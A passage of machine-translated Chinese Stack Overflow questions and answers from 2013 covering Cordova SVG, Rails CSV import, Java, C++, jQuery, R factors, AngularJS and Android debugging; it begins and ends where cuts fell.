    distributed with this work for additional information
    regarding copyright ownership.  The ASF licenses this file
    to you under the Apache License, Version 2.0 (the
    "License"); you may not use this file except in compliance
    with the License.  You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing,
    software distributed under the License is distributed on an
    "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
     KIND, either express or implied.  See the License for the
    specific language governing permissions and limitations
    under the License.
-->
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta name="format-detection" content="telephone=no" />
        <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1, minimum-scale=1, width=device-width, height=device-height, target-densitydpi=device-dpi" />        
        <link rel="stylesheet" type="text/css" href="css/index.css" />
        <title>Hello World</title>

        <script type="text/javascript" src="js/cordova/cordova-android-2.5.0.js"></script>
        <script type="text/javascript" src="js/libs/raphael-min.js"></script>
        <script type="text/javascript" src="js/libs/jquery-min.js"></script>
    </head>
    <body>
        <div class="app">
            <h1>Apache Cordova</h1>
            <div id="deviceready" class="blink">

                <p class="event listening"><a style="" href="informacoes.html">Ir para a p&aacute;gina de informa&ccedil;&otilde;es</a></p>
            </div>
        </div>     
        <script type="text/javascript" src="js/classes/bootstrapper.js"></script>

        <script type="text/javascript">

            app.testPeformance();
        </script>
    </body>
</html> 
```

引导程序.js

```
var app = {

        testPeformance : function () 

        {

            // Creates canvas 320 × 200 at 10, 50
            var paper = Raphael(0, 0, 320, 320);

            for (var i = 0; i < 500 ; i++ )
            {
                x = Math.floor( ( Math.random() *320) +1);
                y = Math.floor( ( Math.random() *320) +1);

                // Creates circle at x = 50, y = 40, with radius 10
                var circle = paper.circle(x, y, 30);
                // Sets the fill attribute of the circle to red (#f00)
                circle.attr("fill", "#f00");

                // Sets the stroke attribute of the circle to white
                circle.attr("stroke", "#fff");

            }

        }

} 
```

它在IOS模拟器上完美运行。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T19:57:53.450

似乎android用于phonegap应用程序的Web容器（webkit）还不支持SVG图形（android 2.2）。

:(

# ruby-on-rails - 使用 rake 任务将空间 CSV 数据导入 Postgres/PostGIS 数据库

> ID：15533570
> 
> 赞同：2
> 
> 时间：2013-03-20T20:04:09.293
> 
> 标签：ruby-on-rails, ruby, postgresql, import, rake

您好我正在尝试将 CSV 数据导入启用空间的 Postgres 数据库。数据可[在此处](http://www.data.gov.bc.ca/dbc/catalogue/detail.page?config=dbc&P110=recorduid:175528&recorduid=175528&title=BC%20Public%20Libraries%20Systems%20-%20Locations)获得。我不确定我哪里出错了，非常感谢任何帮助！我试图做的是使用 D3.js 可视化该数据，并可能显示每个城镇最多图书馆的热密度或某种程度的东西。

```
File: lib/tasks/import_incidents_csv.rake

require 'csv'

namespace :import_incidents_csv do

  task :create_incidents => :environment do

    csv_text = File.read('/home/mgmacri/data/PublicLibraryBranchLocations.csv')
    csv = CSV.parse(csv_text, :headers => true)

    csv.each do |row|
      row = row.to_hash.with_indifferent_access
      Moulding.create!(row.to_hash.symbolize_keys)
    end

  end

end

user@server:/spatial_project$: rake import_incidents_csv:create_incidents --trace
** Invoke import_incidents_csv:create_incidents (first_time)
** Invoke environment (first_time)
** Execute environment
** Execute import_incidents_csv:create_incidents
rake aborted!
invalid byte sequence in UTF-8
/usr/lib/ruby/1.9.1/csv.rb:1855:in `sub!'
/usr/lib/ruby/1.9.1/csv.rb:1855:in `block in shift'
/usr/lib/ruby/1.9.1/csv.rb:1849:in `loop'
/usr/lib/ruby/1.9.1/csv.rb:1849:in `shift'
/usr/lib/ruby/1.9.1/csv.rb:1791:in `each'
/usr/lib/ruby/1.9.1/csv.rb:1805:in `to_a'
/usr/lib/ruby/1.9.1/csv.rb:1805:in `read'
/usr/lib/ruby/1.9.1/csv.rb:1379:in `parse'
/home/mgmacri/rails/mymap/lib/tasks/import_incidents_csv.rake:8:in `block (2 levels) in                                     
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:228:in `call'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:228:in `block in execute'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:223:in `each'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:223:in `execute'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:166:in `block in         invoke_with_call_chain'
/usr/lib/ruby/1.9.1/monitor.rb:211:in `mon_synchronize'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:159:in `invoke_with_call_chain'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/task.rb:152:in `invoke'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:143:in `invoke_task'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:101:in `block (2 levels)     in top_level'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:101:in `each'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:101:in `block in   top_level'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:110:in `run_with_threads'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:95:in `top_level'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:73:in `block in run'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:160:in  `standard_exception_handling'
/var/lib/gems/1.9.1/gems/rake-10.0.3/lib/rake/application.rb:70:in `run'
/var/lib/gems/1.9.1/gems/rake-10.0.3/bin/rake:33:in `<top (required)>'
/usr/local/bin/rake:19:in `load'
/usr/local/bin/rake:19:in `<main>'
Tasks: TOP => import_incidents_csv:create_incidents 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-20T20:16:02.470

Excel 将文件编码`ISO-8859-1`为`UTF-8`. 所以告诉 Ruby 在 ISO-8859-1 中以只读方式打开文件

```
file=File.open("input_file", "r:ISO-8859-1") 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-21T10:42:31.070

使用 postgresql 的原生 CSV 导入比使用 Ruby 的 CSV API 快几个数量级，并且还可以避免相同的编码问题。

例如：

```
namespace :import_incidents_csv do
  task :create_incidents => :environment do
    ActiveRecord::Base.connection.execute "COPY moulding (name, state, postcode, lat, long) FROM '/home/mgmacri/data/PublicLibraryBranchLocations.csv' DELIMITER ',' CSV;"
  end
end 
```

更多信息：[http ://www.postgresql.org/docs/9.2/static/sql-copy.html](http://www.postgresql.org/docs/9.2/static/sql-copy.html)

# java - 基于现有 WSDL 生成 Java Webservice 的工具

> ID：15533571
> 
> 赞同：0
> 
> 时间：2013-03-20T20:04:10.913
> 
> 标签：java, web-services, wsdl

通常，您将能够基于 WSDL 生成 CLIENT java 类。但是，这不是我在这里需要的。

有一个我想为其创建代理的 Web 服务。我需要代理能够公开与 Web 服务完全相同的 WSDL。然后代理将翻译请求并将它们交给另一个系统。由于我有 Web 服务的 WSDL，我认为可能有一个工具可以为代理生成框架代码 (Java)，以便它可以满足该 WSDL。一个工具会很方便，因为这个 Web 服务处理大量的操作。

一旦我有了框架代码，我就可以开始为 WSDL 所具有的每个操作编写逻辑。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:20:11.173

您可以使用 Apache Axis 提供的 wsdl2Java 工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:19:08.617

您可以使用 Progress Software 的 Actional WebService 代理：http: [//www.progress.com/en/Product-Capabilities/continuous-service-optimization.html](http://www.progress.com/en/Product-Capabilities/continuous-service-optimization.html)

它完全符合您的要求。它还允许注册自定义操作处理程序，您可以在其中放置您的 java 代码。它还可以进行开箱即用的 XSLT 转换和调用拆分（例如调用一个服务然后转身并调用多个后端服务）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:23:20.277

我可能误解了这个问题，但这不是任何合同优先的网络服务库所做的吗？我相信 Spring WS 只支持先编写 WSDL，然后从中生成 java 代码。我自己更喜欢 Apache CXF。它首先支持两种方法，java 或 wsdl。

[http://static.springsource.org/spring-ws/sites/2.0/reference/html/tutorial.html](http://static.springsource.org/spring-ws/sites/2.0/reference/html/tutorial.html)

# java - 使用 JTextField 更新 MS Access DB 中的数据

> ID：15533576
> 
> 赞同：0
> 
> 时间：2013-03-20T20:04:23.210
> 
> 标签：java, ms-access, sql-update, jtextfield

我正在尝试使用 JTextField 来更新我的数据库的内容，我有一个框架，其中包含有关特定记录的所有信息，然后我将正确或更改的数据输入到所有 JTextField，然后我尝试使用preparedStatement 执行 UPDATE 语句，但是它似乎不起作用。我正在尝试这种方式：

```
.....
try {
Class.forName("sun.jdbc.odbc.JdbcOdbcDriver");
String Base = "jdbc:odbc:Driver={Microsoft Access Driver (*.mdb)}; DBQ=DATABASE.mdb";
Connection con = DriverManager.getConnection(Base,"","");
PreparedStatement pst = con.prepareStatement("update table_name SET table_item1='?', table_item2='?', table_item3='?', table_item4='?', table_item5=?, table_item6=?, table_item7=? WHERE table_item8=?");
pst.setString(1, tf1.getText());
pst.setString(2, tf2.getText());
pst.setString(3, tf3.getText());
pst.setString(4, tf4.getText());
pst.setString(5, tf5.getText());
pst.setString(6, tf6.getText());
pst.setString(7, tf7.getText());
pst.setString(8, comboItem.getSelectedItem());
int res= pst.excecuteUpdate();
pst.close();
con.close();
...... 
```

在查询中我使用**''**因为它是一个字符串组件，我在*pst.setString(5, tf5.getText());* 也许是因为它的整数值从那里开始，这只是一种预感。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:08:29.777

无需在准备好的语句中为字符串字段使用单引号 (') 并更正“更新”查询：

```
PreparedStatement pst = con.prepareStatement("update table table_name SET table_item1='?' 
```

从所有 '?' 中删除 '' 对于所有**字符串**字段都是这样：

```
PreparedStatement pst = con.prepareStatement("update table table_name SET table_item1=?, 
```

所以正确的查询变成：

```
PreparedStatement pst = con.prepareStatement("update table table_name SET table_item1=?, table_item2=?, table_item3=?, table_item4=?, table_item5=?, table_item6=?, table_item7=? WHERE table_item8=?"); 
```

# c++ - C++ - 使用临时变量的索引数组

> ID：15533577
> 
> 赞同：0
> 
> 时间：2013-03-20T20:04:24.243
> 
> 标签：c++, arrays, string, indexing

我正处于用 C++ 编写一个程序的早期阶段，该程序用英文对应物替换整数输入。我不想要关于如何制作这个程序的说明，而是想要了解代码的某个部分如何以某种方式运行，并可能提示如何修复它。

```
std::string strToEng(std::string s)
{
  int sInt = atoi(s.c_str());

  std::string digit1[] = {"zero", "one", "two", "three", "four", "five", "six", "seven",
                          "eight", "nine", "ten", "eleven", "twelve", "thirteen",
                          "fourteen", "fifteen", "sixteen", "seventeen", "eighteen", 
                          "nineteen"};

  switch(s.size())
  {
    case 1:
    {
      int temp = int(s[0]);
      return digit1[temp];
    }
   }

  return "error";
} 
```

问题在于 switch 语句中的 digit1 数组。当我编译这段代码时，案例 1 没有返回所需的输出。如果我将 digit1[temp] 更改为某种常量（即 digit1[3]），它会正确显示。使用变量索引数组有问题吗？我该如何解决这个问题？

编辑：也许是欺骗性的，我无法处理高于 9 的数字，但它们仍然包含在 digit1 中。原因是这段代码被重写了好几次。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T20:11:48.847

您应该使用`digit1[sInt]`您已经将字符串转换为 int 值...

`s[0]`只是字符串的第一个字符，所以如果第一个字符是，`'0'`那么它的值为 48（参见 ASCII 表），然后您访问表的第 49 个元素......在您的情况 1 中，您可以尝试`int(s[0])-'0'`，它应该可以工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:12:15.817

您将 s 的第一个字符转换为 int，因此如果 s 包含一个数字，则该值在 48 到 57 的十进制数字的 ASCII 值范围内。为什么不使用您在第一行正确创建的 int sInt你的功能？

# javascript - javascript 获取选择下拉列表 Internet Explorer

> ID：15533586
> 
> 赞同：0
> 
> 时间：2013-03-20T20:04:50.807
> 
> 标签：javascript, internet-explorer, html-select

我有一个 7 列的表，其中编辑模式是使用 javascript 处理的。单击行中的编辑将使 2 列可编辑。它们分别更改为下拉列表和文本框，并且将为该行显示“保存取消”选项。

在 Firefox 上保存作品，但不完全在 IE 上。IE 不会从下拉列表中获取值。它只保存文本框中的值。

这就是我选择对象的方式：

```
var jqInputs = $('input', nRow);
var jqSelect = $('select', nRow);

jqSelect[0].value  
jqInputs[0].value   //This is the textbox and it Works 
```

我必须说页面的源代码没有显示选择标记的迹象。（当它已经处于编辑模式时）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:07:07.067

您可以使用[`val()`](http://api.jquery.com/val/)jQuery 函数。

它规范了跨浏览器的值的读取和设置。它也适用于`select`元素。

你的代码不工作，因为当你得到`jqSelect[0]`你实际上有一个 DOM 元素。该`select`元素没有`value`属性。如果您想从选择中读取选定的选项，您需要遍历所有`option`元素并找到选定的元素（通过`selected`选项上的属性）。

这实际上就是`jQuery.fn.val()`这样做的。所以像这样使用它：

```
var selectedValue = jqSelect.val(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:08:23.517

试试这个...

```
 jqSelect.eq(0).val()
 jqInputs.eq(0).val() 
```

您必须使用 jQuery val() 函数来检索元素的值...

# javascript - php图片标题输出显示

> ID：15533587
> 
> 赞同：-4
> 
> 时间：2013-03-20T20:04:51.500
> 
> 标签：javascript

我有一个图像，其中标题值如下：

图片标题：

```
title="sample" 
```

示例代码：

```
<img src="images/bar_offpeak.jpg" class="usagegraphimage" id="ctl00_ctl00_contentDefault_contentControlPanel_totalusage" width="19" height="<?php echo "$bar" ?>%" title="<?php echo "$dailyuse" ?>GB" value="<?php echo "$dailyuse" ?>" alt="Click to view usage"/> 
```

单击图像后，我希望在图像下方显示图像“标题”的文本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:47:55.843

如果你想：

> > 单击图像后显示图像“标题”

如果有帮助，可以使用 javascipt（在本例中使用 jquery）来实现：

```
<div id="imgArea">
    <img src="http://www.google.co.uk/images/srpr/logo4w.png" title="The Image Title" id="imgToClick" />
    <div id="imgTitle"></div>
</div>
<script type="text/javascript">
$('#imgArea').delegate('#imgToClick','click',function(){
    var title = $(this).attr('title');
    $('#imgTitle').html(title);
});
</script> 
```

jsfiddle：http: [//jsfiddle.net/rLTac/](http://jsfiddle.net/rLTac/)

# r - R：因子水平，将其余部分重新编码为“其他”

> ID：15533594
> 
> 赞同：12
> 
> 时间：2013-03-20T20:05:12.173
> 
> 标签：r, r-factor

我很少使用因子，通常认为它们是可以理解的，但我经常对特定操作的细节感到模糊。目前，我正在将几乎没有观察到的类别编码/折叠到“其他”中，并且正在寻找一种快速的方法来做到这一点——我可能有 20 个级别的变量，但我有兴趣将它们中的一堆折叠成一个。

```
data <- data.frame(employees = sample.int(1000,500),
                   naics = sample(c('621111','621112','621210','621310','621320','621330','621340','621391','621399','621410','621420','621491','621492','621493','621498','621511','621512','621610','621910','621991','621999'),
                                  100, replace=T)) 
```

这是我的兴趣水平，以及它们在不同向量中的标签。

```
#levels and labels
top8 <-c('621111','621210','621399','621610','621330',
         '621310','621511','621420','621320')
top8_desc <- c('Offices of physicians',
               'Offices of dentists',
               'Offices of all other miscellaneous health practitioners',
               'Home health care services',
               'Offices of Mental Health Practitioners',
               'Offices of chiropractors',
               'Medical Laboratories',
               'Outpatient Mental Health and Substance Abuse Centers',
               'Offices of optometrists') 
```

我可以使用该`factor()`调用，将它们全部枚举，每当一个类别几乎没有观察到时，将它们归类为“其他”。

假设上述`top8`和以上是实际的前 8 名，那么声明为因子变量`top8_desc`的最佳方式是什么，以便正确编码中的值并将其他所有内容重新编码为？`data$naics``top8``other`

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-20T20:23:43.980

我认为最简单的方法是将所有不在前 8 名中的 naics 重新标记为特殊值。

```
data$naics[!(data$naics %in% top8)] = -99 
```

然后你可以在把它变成一个因素的时候使用“排除”选项

```
factor(data$naics, exclude=-99) 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2018-04-06T21:15:13.953

您可以使用`forcats::fct_other()`：

```
library(forcats)
data$naics <- fct_other(data$naics, keep = top8, other_level = 'other') 
```

或`fct_other()`用作 a 的一部分`dplyr::mutate()`：

```
library(dplyr)
data <- mutate(data, naics = fct_other(naics, keep = top8, other_level = 'other')) 

data %>% head(10)
   employees  naics
1        420  other
2        264  other
3        189  other
4        157 621610
5        376 621610
6        236  other
7        658 621320
8        959 621320
9        216  other
10       156  other 
```

请注意，如果`other_level`未设置参数，则其他级别默认为“Other”（大写“O”）。

相反，如果您只想将几个因素转换为“其他”，则可以使用该参数`drop`：

```
data %>%  
  mutate(keep_fct = fct_other(naics, keep = top8, other_level = 'other'),
         drop_fct = fct_other(naics, drop = top8, other_level = 'other')) %>% 
  head(10)

   employees  naics keep_fct drop_fct
1        474 621491    other   621491
2        805 621111   621111    other
3        434 621910    other   621910
4        845 621111   621111    other
5        243 621340    other   621340
6        466 621493    other   621493
7        369 621111   621111    other
8         57 621493    other   621493
9        144 621491    other   621491
10       786 621910    other   621910 
```

`dpylr`也有`recode_factor()`可以将`.default`参数设置为其他的位置，但是要重新编码的级别数量更多，就像这个例子一样，可能很乏味：

```
data %>% 
   mutate(naices = recode_factor(naics, `621111` = '621111', `621210` = '621210', `621399` = '621399', `621610` = '621610', `621330` = '621330', `621310` = '621310', `621511` = '621511', `621420` = '621420', `621320` = '621320', .default = 'other')) 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-08-21T01:40:44.050

迟到的入场

这是一个`plyr::mapvalues`允许 a`remaining`参数（您的`other`）的包装器

```
library(plyr)

Mapvalues <- function(x, from, to, warn_missing= TRUE, remaining = NULL){
  if(!is.null(remaining)){
    therest <- setdiff(x, from)
    from <- c(from, therest)
    to <- c(to, rep_len(remaining, length(therest)))
  }
  mapvalues(x, from, to, warn_missing)
}
# replace the remaining values with "other"
Mapvalues(data$naics, top8, top8_desc,remaining = 'other')
# leave the remaining values alone
Mapvalues(data$naics, top8, top8_desc) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-20T13:51:31.883

我写了一个函数来做到这一点，可能对其他人有用？我首先以相对的方式检查，如果一个水平出现低于基数的 mp 百分比。之后，我检查以将最大级别数限制为 ml。

ds 是 data.frame 类型的数据集，我对作为因素出现在 cat_var_names 中的所有列执行此操作。

```
cat_var_names <- names(clean_base[sapply(clean_base, is.factor)])

recodeLevels <- function (ds = clean_base, var_list = cat_var_names, mp = 0.01, ml = 25) {
  # remove less frequent levels in factor
  # 
  n <- nrow(ds)
  # keep levels with more then mp percent of cases
  for (i in var_list){
    keep <- levels(ds[[i]])[table(ds[[i]]) > mp * n]
    levels(ds[[i]])[which(!levels(ds[[i]])%in%keep)] <- "other"
  }

  # keep top ml levels
  for (i in var_list){
    keep <- names(sort(table(ds[i]),decreasing=TRUE)[1:ml])
    levels(ds[[i]])[which(!levels(ds[[i]])%in%keep)] <- "other"
  }
  return(ds)
} 
```

# javascript - 确定 Sencha Touch 和 ExtJS 项目的构建配置

> ID：15533596
> 
> 赞同：1
> 
> 时间：2013-03-20T20:05:20.487
> 
> 标签：javascript, extjs, build, sencha-touch, sencha-touch-2

在 sencha touch 中，您可以在以下任何构建配置中构建项目

1.  生产
2.  测试
3.  本国的
4.  包裹

ST2 中是否有返回当前构建配置名称的类/方法/函数？

ExtJs 也是如此（不要与 sencha touch 混淆）。

我想转储（`console.log`）很多关于`testing`或`debug`配置的调试信息。

# angularjs - 'drop' 事件监听器的 angular.bind() 行为不正常

> ID：15533602
> 
> 赞同：3
> 
> 时间：2013-03-20T20:05:47.260
> 
> 标签：angularjs, angularjs-directive

[Plunker 演示代码](http://plnkr.co/edit/Cvms35UyKOV1iwUmvLqN)

我有一个将指令设置为属性的`<div>`元素：`dragAndDrop`

```
<div ng-class="divClass" drag-and-drop>Drop files here</div> 
```

*（作为一个方面，不太重要的说明，ng-class 的行为不符合预期，但这是一个[单独的问题](https://stackoverflow.com/questions/15419839/angularjs-directive-scope-not-setting-ng-class-on-element)）* 我希望用户将文件从他们的桌面拖放到 div。不过，这样做后，我会使用它`angular.bind()`来检测 drop 事件。当然，一旦它们掉线，我就会调用`e.stopPropagation()`and `e.preventDefault()`，但是无论如何页面都会继续重定向页面。我做错了什么会阻止上述两种方法执行？

`dragAndDrop`指示：

```
directive('dragAndDrop', function() {
  return {
    restrict: 'A',
    link: function($scope, elem, attr) {
      elem.bind('dragenter', function(e) {
        e.stopPropagation();
        e.preventDefault();
        // still can't get this one to behave:
        // https://stackoverflow.com/q/15419839/740318
        $scope.divClass = 'on-drag-enter';
      });
      elem.bind('dragleave', function(e) {
        e.stopPropagation();
        e.preventDefault();
        $scope.divClass = '';
      });
      elem.bind('drop', function(e) {
        var droppedFiles = e.dataTransfer.files;
        // It's as though the following two methods never occur
        e.stopPropagation();
        e.preventDefault();

        if (droppedFiles.length > 0) {
          for (var i=0,ii=droppedFiles.length;i<ii;i++) {
            $scope.files.push(droppedFiles[i]);
          }
        }
      });
    }
  };
}); 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-20T21:03:56.137

Angular 不知道您注册的事件处理程序何时被触发，因此您需要通知 Angular 您已更改范围变量。你用这个[`$apply`](http://docs.angularjs.org/api/ng.$rootScope.Scope#$apply)函数来做到这一点。

```
$scope.$apply(function () {
    $scope.divClass = 'on-drag-enter';
}); 
```

~~当涉及到 drop 处理程序时，您是正确的 -`var droppedFiles = e.dataTransfer.files;`由于该语句导致运行时错误，因此之后的语句永远不会运行。~~

`e`是一个 jQuery 事件，而`dataTransfer`是实际 DOM 事件的一个属性。要解决此问题，您需要通过`originalEvent`属性访问原始事件。

```
var droppedFiles = e.originalEvent.dataTransfer.files; 
```

 ~~**更新**

`e.originalEvent`仅当您在 Angular 之前包含 jQuery 时才需要，但由于您尚未在 plnkr 中执行此操作，因此该解决方案无效，对此我深表歉意。

似乎您需要通过[`preventDefault`dragover 事件](https://developer.mozilla.org/en-US/docs/Web/Events/dragover)选择支持放置（也许这也可以在其他事件中完成 - 尚未测试。）

```
elem.bind('dragover', function (e) {
    e.stopPropagation();
    e.preventDefault();
}); 
```

[更新了 plnkr](http://plnkr.co/edit/Uidw0XvRSRzzQrxMgwy5?p=preview)。~~

# android - MainActivty 中的意图回收

> ID：15533609
> 
> 赞同：0
> 
> 时间：2013-03-20T20:06:07.177
> 
> 标签：android, android-intent, keylistener

在收到来自 EditText 字段的条目后，我试图在我的 MainActivity 类上启动一个意图。我通过一些额外的数据。在我的 MainActivity 中，我检查是否有来自 Intent 的任何额外内容。如果是这样，我会在异步任务中处理数据。问题是我的 MainActivity 经历了两次检查 Intent 中的额外内容并最终导致程序炸弹的过程。这非常令人困惑，我将在下面展示程序的流程。下面首先是在 MainActivity 下方的另一个活动中启动 Intent。

```
 thisLocation = (EditText) findViewById(R.id.restlocation);

        thisLocation.setOnKeyListener(new View.OnKeyListener() {
            public boolean onKey(View v, int keyCode, KeyEvent event) {
                if((keyCode == KeyEvent.KEYCODE_DPAD_CENTER)  ||
                        (keyCode == KeyEvent.KEYCODE_ENTER)) {
                    String location = thisLocation.getText().toString();
                    Log.d("Location in key listener", location);
                    try
                    {
                    List<Address> foundGeocode = null;

                    foundGeocode = new Geocoder(getApplicationContext()).getFromLocationName(location, 1);
                    double  newlat = foundGeocode.get(0).getLatitude(); //getting latitude
                    double  newlng = foundGeocode.get(0).getLongitude();//getting longitude
                    Log.d("Lat in key listener", String.valueOf(newlat));
                    Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    intent.putExtra("lat", String.valueOf(lat));
                    intent.putExtra("lng", String.valueOf(lng));
                    startActivity(intent);

                    }

                    catch (IOException e) {
                        Log.e("Geocode", String.valueOf(e));
                    }

    return true;
    }
    return false;
   }
 }); 
```

我可以从我的日志中得知，在进入 MainActivity 之前，处理过程会经历两次上述例程。第一次通过监听器后，logcat 显示标签“MapActivity”和“onDestroy leave light on for com.example.herbx.Restaurant”的文本，即上述活动。下一次通过我进入我的 MainActivity 时，它每次也会通过以下逻辑两次，然后在我的 logcat 上显示以下消息：Tag = MapActivity Text=Recycling map object。

接下来是 MainActivity 处理从上述活动中接收到的 Intent 中的 extras。

```
 protected void onCreate(Bubdke savedInstanceState) {
       ......  intialization code

        Bundle extras = getIntent().getExtras();
    if(extras != null)
    {

        lat = Float.parseFloat(extras.getString("lat"));
        lng = Float.parseFloat(extras.getString("lng"));
        Log.d("lat=", String.valueOf(lat));
        NewMap(lat, lng);  // This is an asynchronous task
    }
       } 
```

下面是我的 logcat 转储，显示了我记录某些数据的位置。

```
 03-20 19:21:30.256: D/Location in key listener(4045): Peoria
    03-20 19:21:30.519: D/Lat in key listener(4045): 40.6936488
    03-20 19:21:30.616: D/MapActivity(4045): onDestroy leaving the lights on for com.example.herb4.Restaurant@40fc2f88
    03-20 19:21:30.736: D/Location in key listener(4045): Peoria
    03-20 19:21:30.986: D/Lat in key listener(4045): 40.6936488
    03-20 19:21:31.016: I/Choreographer(4045): Skipped 45 frames!  The application may be doing too much work on its main thread.
    03-20 19:21:31.168: W/MapActivity(4045): Recycling dispatcher android_maps_conflict_avoidance.com.google.googlenav.datarequest.DataRequestDispatcher@40cf8f38
    03-20 19:21:31.207: V/MapActivity(4045): Recycling map object.
    03-20 19:21:31.426: D/lat=(4045): 40.9040412902832
    03-20 19:21:31.746: D/newmap addr=(4045): W 7th StMinonk, IL 61760
    03-20 19:21:31.896: W/MapActivity(4045): Recycling dispatcher android_maps_conflict_avoidance.com.google.googlenav.datarequest.DataRequestDispatcher@40cf8f38
    03-20 19:21:31.948: V/MapActivity(4045): Recycling map object.
    03-20 19:21:32.166: D/lat=(4045): 40.9040412902832
    03-20 19:21:32.206: D/GetRestaurant lat=(4045): 40.9040412902832
    03-20 19:21:32.387: D/newmap addr=(4045): W 7th StMinonk, IL 61760
    03-20 19:21:32.446: I/Choreographer(4045): Skipped 69 frames!  The application may be doing too much work on its main thread.
    03-20 19:21:32.726: D/dalvikvm(4045): GREF has increased to 201
    03-20 19:21:32.956: D/InputEventConsistencyVerifier(4045): KeyEvent: ACTION_UP but key was not down.
    03-20 19:21:32.956: D/InputEventConsistencyVerifier(4045):   in android.view.ViewRootImpl@4109f880
    03-20 19:21:32.956: D/InputEventConsistencyVerifier(4045):   0: sent at 15675516000000, KeyEvent { action=ACTION_UP, keyCode=KEYCODE_ENTER, scanCode=28, metaState=0, flags=0x8, repeatCount=0, eventTime=15675516, downTime=15675423, deviceId=0, source=0x101 }
    03-20 19:21:33.166: E/InputEventReceiver(4045): Exception dispatching input event.
    03-20 19:21:33.166: E/MessageQueue-JNI(4045): Exception in MessageQueue callback: handleReceiveCallback
    03-20 19:21:33.256: E/MessageQueue-JNI(4045): java.lang.IndexOutOfBoundsException: Invalid index 0, size is 0
   03-20 19:21:33.256: E/MessageQueue-JNI(4045):    at java.util.ArrayList.throwIndexOutOfBoundsException(ArrayList.java:251)
   03-20 19:21:33.256: E/MessageQueue-JNI(4045):    at java.util.ArrayList.get(ArrayList.java:304) 
```

所以我的问题是，当我在上面的第一个活动中输入数据时，为什么程序会执行两次逻辑？这非常令人困惑，最终我得到一个错误，说 MessageQueue callbackL handleReceiveCallback 中的异常和 IndexOutOfBoundsException。
如果有人需要关于这个令人困惑的问题的更多信息，请告诉我。

下面是出现空异常的代码，但我得到了“GetRestaurant lat=”的第一个日志，但没有得到第二个日志，即“GetRestaurant try”。我不知道这两个日志之间会在哪里发生空异常。另外，我从其他来源进入这个例程并且它有效，只是在这种情况下不起作用。

```
 List<String> result = new ArrayList<String>();
URL url;
Log.d("GetRestaurant lat=", thislat);  // this gets logged
try {
 Log.d("GetRestaurant try", "");   //  this doesn't get logged
String query = "?lat=" + thislat + "&lng=" + thislng + "&uid=&vegkey=1";
url = new URL("http://10.0.2.2:8000/herbivorenew/webservice/frontpage1.php" + query);
HttpURLConnection httpConnection = (HttpURLConnection) url.openConnection();
int responseCode = httpConnection.getResponseCode();
if(responseCode == HttpURLConnection.HTTP_OK) {
    InputStream in = httpConnection.getInputStream();
    BufferedReader br = new BufferedReader(
        new InputStreamReader(in));
String line;

int x=0;
while ((line = br.readLine()) != null) {
    result = new ArrayList<String>(Arrays.asList(line.split("&")));
     Log.d("GetRestaurant result=", String.valueOf(result.get(0)));
    x++;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:35:16.637

onKey() 被调用两次，一次是按下键，一次是松开键。你需要做的是这样的：

```
public boolean onKey(View v, int keyCode, KeyEvent event) {

        if (keyCode == KeyEvent.KEYCODE_DPAD_CENTER ||
            keyCode == KeyEvent.KEYCODE_ENTER) {
            if (event.getAction()!=KeyEvent.ACTION_DOWN) {
                return true;
            }

            // here goes your code

            return true;
        }

        return false;
    } 
```

# jenkins - Hudson 脚本有意外的流终止

> ID：15533614
> 
> 赞同：0
> 
> 时间：2013-03-20T20:06:29.323
> 
> 标签：jenkins, hudson, hudson-plugins

我有一个 bat 脚本，可以将 Hudson 设置为无头模式，以便 Jenkins 可以连接并执行自动构建。

该脚本已经运行了 2 年。为了解决一个问题，IT 技术人员将互联网端口从 100Mb/s 更改为 1Gigb/s。现在，脚本出现以下错误。我们将线路切换回来，但问题仍然存在。

我不确定线速度是否是问题的原因。我所知道的是它起作用了，端口改变了速度，现在它已经停止工作了。

slave_launch_command.bat

```
